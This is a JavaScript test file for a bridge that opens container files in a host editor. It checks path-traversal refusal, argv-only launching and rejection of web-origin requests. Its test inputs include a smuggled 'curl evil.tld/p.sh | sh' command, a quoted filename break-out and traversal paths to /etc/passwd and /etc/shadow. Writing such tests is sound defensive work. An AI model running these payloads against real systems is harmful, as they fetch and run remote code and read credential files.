import { describe, expect, it, vi } from "vitest";
import { createRequestHandler, resolveHostFile } from "./host-editor-bridge.js";

const HOST_ROOT = "/Users/dev/project";
const CONTAINER_ROOT = "/var/www/html";

/** Stands in for the ServerResponse, recording what the handler answered. */
const fakeResponse = () => {
  const res = {
    statusCode: 200,
    body: undefined,
    writeHead(code) {
      res.statusCode = code;
      return res;
    },
    end(body) {
      res.body = body;
      return res;
    },
  };
  return res;
};

const handle = (query, { headers = {}, method = "GET" } = {}) => {
  const launch = vi.fn();
  const res = fakeResponse();

  createRequestHandler({ hostRoot: HOST_ROOT, containerRoot: CONTAINER_ROOT, launch })(
    { url: `/open?${query}`, method, headers },
    res,
  );

  return { launch, res };
};

describe("resolveHostFile", () => {
  it("maps a container path onto the host root", () => {
    expect(resolveHostFile(`${CONTAINER_ROOT}/resources/js/main.ts`, {
      hostRoot: HOST_ROOT,
      containerRoot: CONTAINER_ROOT,
    })).toBe(`${HOST_ROOT}/resources/js/main.ts`);
  });

  it("refuses a path that climbs out of the host root", () => {
    // `..` survives the prefix swap, so the check has to run on the resolved
    // path rather than on what the caller sent.
    expect(resolveHostFile(`${CONTAINER_ROOT}/../../etc/passwd`, {
      hostRoot: HOST_ROOT,
      containerRoot: CONTAINER_ROOT,
    })).toBeNull();
  });

  it("refuses an absolute path that was never inside the container root", () => {
    expect(resolveHostFile("/etc/shadow", {
      hostRoot: HOST_ROOT,
      containerRoot: CONTAINER_ROOT,
    })).toBeNull();
  });
});

describe("host editor bridge", () => {
  it("opens a file at a line and column", () => {
    const { launch, res } = handle(
      `file=${encodeURIComponent(`${CONTAINER_ROOT}/app/Models/User.php`)}&line=42&column=7`,
    );

    expect(res.body).toBe("ok");
    expect(launch).toHaveBeenCalledWith(
      "phpstorm",
      ["--line", "42", "--column", "7", `${HOST_ROOT}/app/Models/User.php`],
      expect.any(Function),
    );
  });

  it("passes arguments as an argv array, so a shell never sees them", () => {
    const { launch } = handle(
      `file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}&line=${encodeURIComponent("1; curl evil.tld/p.sh | sh")}`,
    );

    // The payload used to be interpolated into a shell string. What matters is
    // not that it was escaped but that there is no shell: the command is fixed
    // and every argument is a separate array element.
    const [command, argv] = launch.mock.calls[0];
    expect(command).toBe("phpstorm");
    expect(argv).toEqual(["--line", "1", "--column", "1", `${HOST_ROOT}/a.php`]);
  });

  it("keeps a quoted break-out in the filename from reaching a command", () => {
    // `"` and `$( )` escaped the old double-quoted interpolation. Here the name
    // simply fails to resolve inside the host root, and nothing is launched.
    const { launch, res } = handle(
      `file=${encodeURIComponent('/tmp/x"; touch pwned; "')}&line=1`,
    );

    expect(res.statusCode).toBe(403);
    expect(launch).not.toHaveBeenCalled();
  });

  it("falls back to line 1 for a position that is not a positive integer", () => {
    // `1e9` is in here because `parseInt` stops at the `e` and would otherwise
    // let an exponent through as a plausible-looking number.
    for (const value of ["0", "-5", "abc", "1e9", ""]) {
      const { launch } = handle(
        `file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}&line=${encodeURIComponent(value)}`,
      );
      expect(launch.mock.calls[0][1][1]).toBe("1");
    }
  });

  it("turns away a request carrying a web origin", () => {
    // A page the developer visits can trigger the GET but cannot strip this.
    const { launch, res } = handle(
      `file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}&line=1`,
      { headers: { origin: "https://evil.tld" } },
    );

    expect(res.statusCode).toBe(403);
    expect(launch).not.toHaveBeenCalled();
  });

  it("turns away a request carrying a referer", () => {
    const { launch, res } = handle(
      `file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}&line=1`,
      { headers: { referer: "https://evil.tld/post" } },
    );

    expect(res.statusCode).toBe(403);
    expect(launch).not.toHaveBeenCalled();
  });

  it("still serves the container, which sends neither header", () => {
    const { launch } = handle(`file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}&line=1`);

    expect(launch).toHaveBeenCalled();
  });

  it("rejects a method other than GET", () => {
    const { launch, res } = handle(
      `file=${encodeURIComponent(`${CONTAINER_ROOT}/a.php`)}`,
      { method: "POST" },
    );

    expect(res.statusCode).toBe(405);
    expect(launch).not.toHaveBeenCalled();
  });

  it("asks for a file when none was given", () => {
    const { launch, res } = handle("line=1");

    expect(res.statusCode).toBe(400);
    expect(launch).not.toHaveBeenCalled();
  });
});
